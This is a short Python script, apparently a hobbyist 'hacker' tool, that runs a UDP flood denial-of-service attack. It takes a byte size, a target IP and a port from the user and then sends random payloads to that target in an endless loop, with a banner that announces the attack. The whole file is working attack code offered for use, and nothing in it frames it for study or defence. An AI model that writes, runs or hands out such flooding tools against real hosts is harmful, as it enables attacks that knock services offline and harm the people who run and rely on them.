import os
import random
import socket
import platform

# Display platform-specific message
if platform.system() in ["Linux", "Darwin"]:
    os.system("clear")
    if platform.system() == "Darwin":
        print("This Script Works Best on Kali Linux")
elif platform.system() == "Windows":
    os.system("cls")
else:
    print("\033[1;34m [-] Unknown System Detected \033[1;m")

print("\033[1;32m")

print("""
     _      _      _
    (.)< __(.)> __(.)=
  \___)  \___)  \___)   Ready To Send
  
=======================================
     Created By: TheTechHacker
=======================================
If You Use too much bytes 
Your Internet might get a bit slow
=======================================
""")

try:
    size = int(input("bytes> "))
    attack = random._urandom(size)
    ip = input("IP> ")
    port = int(input("port> "))
    print(" ")
    print("Launching Attack")
    print(" ")
except (ValueError, KeyboardInterrupt):
    print(" ")
    exit("\033[1;34m ERROR \033[1;m")

while True:
    try:
        connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        connect.sendto(attack, (ip, port))
        print("Attacking sending bytes ===>")
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-] Canceled By User \033[1;m")
    except ImportError:
        print(" ")
        exit("\033[1;34m [-] Install Python 2.7.15")
